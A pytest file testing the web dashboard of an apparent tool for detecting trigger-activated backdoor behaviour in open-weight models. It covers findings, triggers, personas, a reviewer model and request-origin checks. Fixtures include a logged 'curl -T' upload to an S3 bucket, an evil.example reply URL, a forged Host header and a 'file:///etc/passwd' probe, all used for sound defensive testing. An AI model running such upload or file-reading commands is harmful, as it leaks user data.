"""The local web page: what it shows by level, what it lets a person change, and what a page from another site cannot do."""
from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

from canary.config import sample_config
from canary.findings import FindingsLog
from canary.gui.server import MASK, App, Handler
from canary.util import write_json


@pytest.fixture
def gui(tmp_path):
    config = sample_config()
    config["state_dir"] = str(tmp_path / "state")
    config["target"]["api_key"] = "sk-secret-value"
    (tmp_path / "canary.json").write_text(json.dumps(config), encoding="utf-8")
    state = tmp_path / "state"
    log = FindingsLog(state / "findings.jsonl", "run-1")
    log.append("high", "canary_in_url", {"url": "https://x.example.com/?c=abc", "turn": 41, "since_trigger": {"family": "date", "turn": 8, "turns_ago": 33}}, 1, "sensitive")
    log.append("high", "tool_shell_upload", {"command": "curl -T a https://bucket.s3.amazonaws.com/a"}, 1, "sensitive", harness="hermes")
    log.append("medium", "tool_unjustified", {"arguments": "ls", "turn": 2}, 1, "control", harness="hermes")
    log.append("info", "model_error", {"error": "timeout"}, 2, "control")
    from canary.util import append_jsonl
    append_jsonl(state / "sessions.jsonl", {"session": 1, "time": "t", "persona": {"id": "x", "category": "ai_leader", "name": "N", "role": "chief executive", "org": "O", "real": False},
                                           "style": "inline", "items": {"sensitive": {"domain": "ai_lab"}}, "conversations": {"sensitive": {"narrative": {"planned": 3, "done": 3, "stopped": "", "triggers": [{"turn": 2, "family": "date", "text": "today"}], "bait": []}}},
                                           "harness_conversations": [{"role": "sensitive", "profile": "hermes", "tool_calls": 2}]})
    write_json(state / "conversations" / "s00001_sensitive.json", {"turns": [{"user": "hello", "reply": {"text": "hi"}}, {"user": "again", "reply": {"text": "yes"}}]})
    app = App(tmp_path / "canary.json")
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), type("H", (Handler,), {"app": app}))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}", app, tmp_path
    httpd.shutdown()


def get(base, path, headers=None):
    req = urllib.request.Request(base + path, headers=headers or {})
    with urllib.request.urlopen(req) as r:
        return r.status, r.read()


def post(base, path, body, headers=None):
    h = {"Content-Type": "application/json", "X-Canary-GUI": "1", **(headers or {})}
    req = urllib.request.Request(base + path, data=json.dumps(body).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")


def test_the_page_and_the_summary_count_findings_by_level(gui):
    base, _, _ = gui
    status, page = get(base, "/")
    assert status == 200 and b"Openweight Canary" in page
    for url in (b"https://tadamoo.com", b"https://github.com/nuspy/tadamoo", b"https://malweight.com", b"https://github.com/nuspy/Openweight-Canary"):
        assert url in page, url
    assert b"Install TaDaMoo" in page and b"MalWeight Canary" in page
    s = json.loads(get(base, "/api/summary")[1])
    assert s["by_level"] == {"normal": 1, "interesting": 1, "suspicious": 0, "very_suspicious": 1, "critical": 1} and s["sessions"] == 1 and s["chain_ok"]
    assert [lv["colour"] for lv in s["levels"]] == ["white", "green", "yellow", "orange", "red"]


def test_findings_are_filtered_by_level_kind_text_and_trigger(gui):
    base, _, _ = gui
    allf = json.loads(get(base, "/api/findings")[1])
    assert allf["total"] == 4 and allf["items"][0]["level_id"] == "critical" and allf["items"][0]["kind"] == "canary_in_url"
    assert json.loads(get(base, "/api/findings?level=3,4")[1])["total"] == 2
    assert json.loads(get(base, "/api/findings?kind=tool_unjustified")[1])["items"][0]["harness"] == "hermes"
    assert json.loads(get(base, "/api/findings?q=amazonaws")[1])["total"] == 1
    assert json.loads(get(base, "/api/findings?trigger=date")[1])["total"] == 1
    assert json.loads(get(base, "/api/findings?role=control&harness=hermes")[1])["total"] == 1
    assert json.loads(get(base, "/api/findings?order=new")[1])["items"][0]["n"] == 4


def test_a_finding_a_session_and_a_conversation_can_be_opened(gui):
    base, _, _ = gui
    assert json.loads(get(base, "/api/finding/1")[1])["level"] == 4
    sessions = json.loads(get(base, "/api/sessions")[1])
    assert sessions[0]["worst"]["level"] == 4 and sessions[0]["persona"]["org"] == "O" and sessions[0]["narrative"]["triggers"][0]["family"] == "date"
    conv = json.loads(get(base, "/api/conversation?session=1&role=sensitive&profile=")[1])
    assert [t["user"] for t in conv["turns"]] == ["hello", "again"] and conv["triggers"][0]["turn"] == 2
    with pytest.raises(urllib.error.HTTPError) as e:
        get(base, "/api/conversation?session=9&role=sensitive")
    assert e.value.code == 404


def test_a_key_is_never_sent_back_and_a_masked_key_is_kept_on_save(gui):
    base, app, tmp = gui
    cfg = json.loads(get(base, "/api/config")[1])
    assert cfg["target"]["api_key"] == MASK and "sk-secret-value" not in get(base, "/api/config")[1].decode()
    code, _ = post(base, "/api/config", {"target": {"model": "qwen3.8-flash-next", "api_key": MASK}, "narrative": {"enabled": True, "turns": 100}})
    assert code == 200
    saved = json.loads((tmp / "canary.json").read_text(encoding="utf-8"))
    assert saved["target"]["api_key"] == "sk-secret-value" and saved["target"]["model"] == "qwen3.8-flash-next" and saved["narrative"]["turns"] == 100
    assert (tmp / "canary.json.bak").exists()


def test_a_setting_that_does_not_load_is_refused_and_nothing_is_written(gui):
    base, _, tmp = gui
    before = (tmp / "canary.json").read_text(encoding="utf-8")
    code, body = post(base, "/api/config", {"narrative": {"turns": 1}})
    assert code == 400 and "turns" in body["error"]
    assert (tmp / "canary.json").read_text(encoding="utf-8") == before


def test_a_page_from_another_site_cannot_change_anything(gui):
    base, _, _ = gui
    code, _ = post(base, "/api/config", {"seed": 5}, headers={"X-Canary-GUI": "0"})
    assert code == 403
    req = urllib.request.Request(base + "/api/start", data=b"{}", method="POST")
    with pytest.raises(urllib.error.HTTPError) as e:
        urllib.request.urlopen(req)
    assert e.value.code == 403
    with pytest.raises(urllib.error.HTTPError) as e:
        get(base, "/api/summary", headers={"Host": "evil.example.com"})
    assert e.value.code == 403


def test_the_options_list_the_engines_harnesses_personas_and_triggers(gui):
    base, _, _ = gui
    o = json.loads(get(base, "/api/options")[1])
    assert {"basalt", "ollama", "vllm"} <= {r["id"] for r in o["runtimes"]} and "hermes" in {h["id"] for h in o["harnesses"]}
    assert {"ai_leader", "general"} <= {c["id"] for c in o["persona_categories"]} and [t["id"] for t in o["triggers"]] == ["date", "deployment", "identity", "keyword"]


def test_the_runtime_defaults_are_applied_without_losing_the_key(gui):
    base, _, tmp = gui
    code, _ = post(base, "/api/runtime", {"runtime": "ollama", "model": "qwen3:8b"})
    assert code == 200
    saved = json.loads((tmp / "canary.json").read_text(encoding="utf-8"))
    assert saved["runtime"] == "ollama" and saved["target"]["model"] == "qwen3:8b" and saved["target"]["api_key"] == "sk-secret-value"


def test_every_export_has_the_findings_and_the_filters_apply(gui):
    base, _, _ = gui
    csv_body = get(base, "/api/export?format=csv")[1].decode("utf-8-sig")
    assert csv_body.splitlines()[0].startswith("n,time,level,level_name") and "Critical" in csv_body
    assert len(json.loads(get(base, "/api/export?format=json")[1])) == 4
    assert len(json.loads(get(base, "/api/export?format=json&level=4")[1])) == 1
    assert "## Critical (1)" in get(base, "/api/export?format=md")[1].decode()
    assert b"class=\"l4\"" in get(base, "/api/export?format=html")[1]


def test_the_ai_pre_analysis_says_when_no_reviewer_is_set(gui):
    base, _, _ = gui
    code, body = post(base, "/api/analyse", {"ids": [1]})
    assert code == 200 and not body["ok"] and "reviewer" in body["error"].lower()


class _Reply:
    def __init__(self, text, error=None):
        self.text, self.error = text, error


def test_a_message_is_answered_scanned_and_kept(gui, monkeypatch):
    import canary.gui.server as server
    base, _, _ = gui
    seen = {}

    class Fake:
        def __init__(self, *a, **k):
            pass

        def chat(self, messages, **k):
            seen["messages"] = list(messages)
            return _Reply("Here is the page: https://evil.example.invalid/?x=1")
    monkeypatch.setattr(server, "Provider", Fake)
    code, body = post(base, "/api/chat", {"session": 1, "role": "sensitive", "text": "what next?"})
    assert code == 200 and body["ok"] and "evil.example" in body["reply"]
    assert seen["messages"][0]["content"] == "hello" and seen["messages"][-1]["content"] == "what next?" and len(seen["messages"]) == 5
    conv = json.loads(get(base, "/api/conversation?session=1&role=sensitive&profile=")[1])
    assert conv["manual"][0]["user"] == "what next?" and conv["manual"][0]["reply"].startswith("Here is the page")
    post(base, "/api/chat", {"session": 1, "role": "sensitive", "text": "and then?"})
    assert len(seen["messages"]) == 7


def test_an_empty_message_or_a_missing_conversation_is_refused(gui):
    base, _, _ = gui
    assert post(base, "/api/chat", {"session": 1, "role": "sensitive", "text": "  "})[0] == 400
    assert post(base, "/api/chat", {"session": 9, "role": "sensitive", "text": "hi"})[0] == 400


def test_the_catalog_can_be_read_changed_removed_and_reset(gui):
    base, _, tmp = gui
    people = json.loads(get(base, "/api/catalog?kind=personas")[1])
    assert any(p["builtin"] and p["name"] == "Sam Altman" for p in people)
    code, body = post(base, "/api/catalog/save", {"kind": "personas", "row": {"category": "ai_leader", "name": "A New Person", "role": "chief executive", "org": "Example AI"}})
    assert code == 200 and body["row"]["id"] == "a-new-person"
    code, body = post(base, "/api/catalog/save", {"kind": "personas", "row": {"id": "ai-1", "category": "ai_leader", "name": "Sam Altman", "role": "co-founder", "org": "OpenAI"}})
    rows = {p["id"]: p for p in json.loads(get(base, "/api/catalog?kind=personas")[1])}
    assert rows["ai-1"]["role"] == "co-founder" and rows["ai-1"]["edited"] and not rows["a-new-person"]["builtin"]
    assert post(base, "/api/catalog/reset", {"kind": "personas", "id": "ai-1"})[0] == 200
    assert {p["id"]: p for p in json.loads(get(base, "/api/catalog?kind=personas")[1])}["ai-1"]["role"] == "chief executive"
    assert post(base, "/api/catalog/delete", {"kind": "personas", "id": "ai-2"})[0] == 200
    assert "ai-2" not in {p["id"] for p in json.loads(get(base, "/api/catalog?kind=personas")[1])}
    assert post(base, "/api/catalog/reset", {"kind": "personas"})[0] == 200
    after = {p["id"] for p in json.loads(get(base, "/api/catalog?kind=personas")[1])}
    assert "ai-2" in after and "a-new-person" in after


def test_a_bad_catalog_row_is_refused(gui):
    base, _, _ = gui
    assert post(base, "/api/catalog/save", {"kind": "personas", "row": {"category": "nope", "role": "x", "org": "y"}})[0] == 400
    assert post(base, "/api/catalog/save", {"kind": "figures", "row": {"side": "china", "name": ""}})[0] == 400
    assert post(base, "/api/catalog/save", {"kind": "contexts", "row": {"label": "x", "office": "X", "actors": ["only one"]}})[0] == 400
    assert post(base, "/api/catalog/delete", {"kind": "personas", "id": "no-such"})[0] == 400


def test_a_context_is_added_and_used_for_documents(gui):
    base, _, _ = gui
    row = {"label": "Test context", "office": "TST", "categories": ["general"], "sides": ["usa"],
           **{k: [f"{k} one", f"{k} two"] for k in ("actors", "assets", "places", "topics", "verbs", "past", "types")}}
    code, body = post(base, "/api/catalog/save", {"kind": "contexts", "row": row})
    assert code == 200
    from canary.generator import BANKS
    json.loads(get(base, "/api/catalog?kind=contexts")[1])
    assert body["row"]["id"] in BANKS and BANKS[body["row"]["id"]]["office"] == "TST"


def test_the_page_can_be_mounted_under_a_prefix_inside_another_application(gui):
    from canary.gui.server import handle
    _, _, tmp = gui
    mounted = App(tmp / "canary.json", prefix="/canary", check_host=False)
    code, body, ctype, _ = handle(mounted, "GET", "/canary/api/summary", {"Host": "app.local:7242"})
    assert code == 200 and json.loads(body)["sessions"] == 1
    code, body, ctype, _ = handle(mounted, "GET", "/canary/", {"Host": "app.local:7242"})
    assert code == 200 and ctype.startswith("text/html") and b'"api/' in body and b'"/api/' not in body
    assert handle(mounted, "POST", "/canary/api/stop", {"Host": "app.local"}, b"{}")[0] == 403


def test_a_host_runs_the_test_and_owns_the_engine_while_the_page_keeps_the_rest(gui):
    from canary.gui.server import handle
    _, _, tmp = gui
    calls = []
    app = App(tmp / "canary.json", prefix="/canary", check_host=False, overlay=tmp / "overlay.json",
              start=lambda: calls.append("start") or {"pid": 7}, stop=lambda: calls.append("stop") or {})
    head = {"Host": "app.local", "X-Canary-GUI": "1"}
    code, body, _, _ = handle(app, "POST", "/canary/api/start", head, b"{}")
    assert code == 200 and json.loads(body)["pid"] == 7 and calls == ["start"]
    handle(app, "POST", "/canary/api/stop", head, b"{}")
    assert calls == ["start", "stop"]
    before = (tmp / "canary.json").read_text(encoding="utf-8")
    patch = {"target": {"model": "changed-by-the-page"}, "narrative": {"enabled": True, "turns": 40}, "workspace": {"enabled": True, "files": 12}}
    code, body, _, _ = handle(app, "POST", "/canary/api/config", head, json.dumps(patch).encode())
    assert code == 200
    assert (tmp / "canary.json").read_text(encoding="utf-8") == before                          # the host's config is not touched
    saved = json.loads((tmp / "overlay.json").read_text(encoding="utf-8"))
    assert "target" not in saved and saved["narrative"]["turns"] == 40 and saved["workspace"]["files"] == 12
    view = json.loads(handle(app, "GET", "/canary/api/config", {"Host": "x"})[1])
    assert view["narrative"]["turns"] == 40 and view["target"]["model"] != "changed-by-the-page"


def test_the_ai_pre_analysis_may_use_the_model_under_test_and_says_so(gui, monkeypatch):
    import canary.gui.server as server
    base, _, tmp = gui
    same = {"kind": "openai", "base_url": "http://127.0.0.1:9", "model": "m", "api_key": "", "extra_headers": {}}
    assert post(base, "/api/config", {"target": same, "reviewer": same})[0] == 200

    class Fake:
        def __init__(self, *a, **k):
            pass

        def chat(self, messages, **k):
            return _Reply('{"summary": "nothing stands out", "priorities": [], "probably_legitimate": [], "next_checks": []}')
    monkeypatch.setattr(server, "Provider", Fake)
    code, body = post(base, "/api/analyse", {"ids": [1]})
    assert code == 200 and body["ok"] and body["reviewer_is_target"] is True


class _ModelServer:
    """A server that lists models the OpenAI way (and Ollama's way on another path)."""

    def __init__(self, listing):
        from http.server import BaseHTTPRequestHandler, HTTPServer
        outer = self
        outer.seen = []

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                outer.seen.append((self.path, self.headers.get("Authorization")))
                if self.path in listing:
                    body = json.dumps(listing[self.path]).encode()
                    self.send_response(200)
                else:
                    body = b"{}"
                    self.send_response(404)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
        self.httpd = HTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.httpd.server_address[1]}"

    def close(self):
        self.httpd.shutdown()


def test_the_models_a_provider_offers_are_listed_with_the_stored_key(gui):
    base, _, _ = gui
    srv = _ModelServer({"/v1/models": {"data": [{"id": "qwen3.8-flash-next"}, {"id": "Another-Model"}]}})
    try:
        assert post(base, "/api/config", {"target": {"base_url": srv.url, "model": "qwen3.8-flash-next", "api_key": "sk-listing-key"}})[0] == 200
        code, body = post(base, "/api/models", {"which": "target", "base_url": srv.url, "api_key": "***"})
        assert code == 200 and body["ok"] and body["models"] == ["Another-Model", "qwen3.8-flash-next"]
        assert srv.seen[0] == ("/v1/models", "Bearer sk-listing-key")                                  # the stored key, not the mask
    finally:
        srv.close()


def test_ollama_style_listings_and_unreachable_servers(gui):
    base, _, _ = gui
    srv = _ModelServer({"/api/tags": {"models": [{"name": "llama3:8b"}, {"name": "qwen3:8b"}]}})
    try:
        assert post(base, "/api/models", {"which": "target", "base_url": srv.url})[1]["models"] == ["llama3:8b", "qwen3:8b"]
    finally:
        srv.close()
    code, body = post(base, "/api/models", {"which": "target", "base_url": "http://127.0.0.1:9"})
    assert code == 200 and not body["ok"] and body["models"] == [] and body["error"]
    code, body = post(base, "/api/models", {"which": "target", "base_url": "file:///etc/passwd"})
    assert not body["ok"] and "http" in body["error"]


def test_a_session_still_running_is_listed_from_its_conversations(gui):
    base, _, tmp = gui
    write_json(tmp / "state" / "conversations" / "s00002_sensitive.json", {"turns": [{"user": "a", "reply": {"text": "b"}}]})
    write_json(tmp / "state" / "conversations" / "s00002_control_hermes.json", {"calls": [], "tool_calls": 3, "interactions": 2})
    rows = {r["session"]: r for r in json.loads(get(base, "/api/sessions")[1])}
    assert rows[1].get("in_progress") is None and rows[2]["in_progress"] is True
    assert rows[2]["harness"] == [{"role": "control", "profile": "hermes", "calls": 3, "interactions": 2}]
    conv = json.loads(get(base, "/api/conversation?session=2&role=sensitive&profile=")[1])
    assert conv["turns"][0]["user"] == "a"


def test_the_summary_says_if_the_monitor_answers_and_the_reviews_are_listed(gui):
    base, _, tmp = gui
    s = json.loads(get(base, "/api/summary")[1])
    assert s["monitor"] in ("ok", "down", "off") and s["review_every"] == 10 and s["reviews"] == 0
    write_json(tmp / "state" / "reviews" / "review_0001.json", {"n": 1, "time": "t", "label": "periodic", "reviewer_model": "m", "reviewer_is_target": True, "last_session": 4,
                                                              "assessment": {"summary": "Nothing stands out.", "priorities": [{"n": 1, "why": "check"}], "next_checks": ["read s4"]}, "reply": {}})
    rows = json.loads(get(base, "/api/reviews")[1])
    assert rows[0]["summary"] == "Nothing stands out." and rows[0]["is_target"] and rows[0]["priorities"][0]["n"] == 1
    assert json.loads(get(base, "/api/summary")[1])["reviews"] == 1


def test_a_finding_comes_with_what_it_means_and_the_text_around_it(gui):
    base, _, tmp = gui
    log = FindingsLog(tmp / "state" / "findings.jsonl", "run-2")
    log.append("info", "canary_echo", {"canary": "c", "matched": "ZZ95CANA6107", "turn": 2}, 1, "sensitive")
    write_json(tmp / "state" / "conversations" / "s00001_sensitive.json",
               {"turns": [{"user": "hello", "reply": {"text": "hi"}}, {"user": "draft the note", "reply": {"text": "Payment reference ZZ95CANA6107. Attachments follow."}}]})
    n = max(r["n"] for r in json.loads(get(base, "/api/findings?kind=canary_echo")[1])["items"])
    f = json.loads(get(base, f"/api/finding/{n}")[1])
    assert "given to it earlier" in f["explain"]
    assert f["context"]["user"] == "draft the note" and "ZZ95CANA6107" in f["context"]["reply"] and f["context"]["match"] == "ZZ95CANA6107"


def test_the_pre_analysis_sees_the_text_and_an_empty_answer_is_an_error_not_a_blank(gui, monkeypatch):
    import canary.gui.server as server
    base, _, tmp = gui
    same = {"kind": "openai", "base_url": "http://127.0.0.1:9", "model": "r", "api_key": "", "extra_headers": {}}
    post(base, "/api/config", {"reviewer": same})
    seen = {}

    class Fake:
        answer = ""

        def __init__(self, *a, **k):
            pass

        def chat(self, messages, system=None, max_tokens=1024, **k):
            seen["prompt"], seen["max_tokens"] = messages[0]["content"], max_tokens
            return _Reply(Fake.answer)
    monkeypatch.setattr(server, "Provider", Fake)
    code, body = post(base, "/api/analyse", {"ids": [1]})
    assert code == 200 and not body["ok"] and "nothing" in body["error"] and seen["max_tokens"] == 0
    assert "what_this_kind_means" in seen["prompt"]
    Fake.answer = '{"summary": "Harmless.", "priorities": [], "probably_legitimate": [{"n": 1, "why": "it was asked"}], "next_checks": []}'
    code, body = post(base, "/api/analyse", {"ids": [1]})
    assert body["ok"] and body["assessment"]["summary"] == "Harmless."
    assert post(base, "/api/analyse", {"ids": [999]})[1]["ok"] is False


def test_every_kind_the_code_can_raise_is_explained():
    import glob
    import re
    from canary.levels import KIND_INFO
    kinds = set()
    for path in glob.glob("canary/**/*.py", recursive=True):
        text = open(path, encoding="utf-8").read()
        kinds |= set(re.findall(r'add\("[a-z]+", "([a-z_]+)"', text)) | set(re.findall(r'append\("[a-z]+", "([a-z_]+)"', text))
    kinds -= {"info"}
    assert kinds and not sorted(k for k in kinds if k not in KIND_INFO)


def test_a_finding_says_why_it_has_its_level_and_a_comparison_lists_what_it_is_built_from(gui):
    base, _, tmp = gui
    log = FindingsLog(tmp / "state" / "findings.jsonl", "run-3")
    log.append("high", "harness_trigger_ab", {"sensitive_kinds": ["tool_shell_staging"]}, 1, None, harness="hermes")
    n = max(r["n"] for r in json.loads(get(base, "/api/findings?kind=harness_trigger_ab")[1])["items"])
    f = json.loads(get(base, f"/api/finding/{n}")[1])
    assert f["why_level"].startswith("Very suspicious") and "comparison" in f["why_level"]
    assert [x["n"] for x in f["related"]] == [2, 3]                                    # the hermes findings of session 1 that are not normal
    crit = json.loads(get(base, "/api/finding/1")[1])
    assert crit["why_level"].startswith("Critical") and "turns after a trigger" in crit["why_level"]


def test_a_finding_without_a_turn_number_finds_its_text_by_what_it_matched(gui):
    base, _, tmp = gui
    log = FindingsLog(tmp / "state" / "findings.jsonl", "run-4")
    log.append("low", "suspect_url", {"url": "https://example.net/a?x=1"}, 1, "sensitive")
    write_json(tmp / "state" / "conversations" / "s00001_sensitive.json",
               {"turns": [{"user": "hello", "reply": {"text": "hi"}}, {"user": "again", "reply": {"text": "see https://example.net/a?x=1 for it"}}]})
    n = max(r["n"] for r in json.loads(get(base, "/api/findings?kind=suspect_url")[1])["items"])
    f = json.loads(get(base, f"/api/finding/{n}")[1])
    assert f["context"]["turn"] == 2 and f["context"]["user"] == "again" and f["context"]["match"] == "https://example.net/a?x=1"


def test_the_pre_analysis_can_run_in_the_background_and_be_polled(gui, monkeypatch):
    import time as _t
    import canary.gui.server as server
    base, _, _ = gui
    same = {"kind": "openai", "base_url": "http://127.0.0.1:9", "model": "r", "api_key": "", "extra_headers": {}}
    post(base, "/api/config", {"reviewer": same})

    class Slow:
        def __init__(self, *a, **k):
            pass

        def chat(self, messages, **k):
            _t.sleep(0.6)
            return _Reply('{"summary": "Fine.", "priorities": [], "probably_legitimate": [], "next_checks": []}')
    monkeypatch.setattr(server, "Provider", Slow)
    code, started = post(base, "/api/analyse", {"ids": [1], "async": True})
    assert code == 200 and started["ok"] and started["job"]
    first = json.loads(get(base, f"/api/analyse-status?job={started['job']}")[1])
    assert first["state"] == "running" and "result" not in first
    for _ in range(40):
        status = json.loads(get(base, f"/api/analyse-status?job={started['job']}")[1])
        if status["state"] == "done":
            break
        _t.sleep(0.1)
    assert status["state"] == "done" and status["result"]["ok"] and status["result"]["assessment"]["summary"] == "Fine."
    assert json.loads(get(base, "/api/analyse-status?job=nope")[1])["ok"] is False
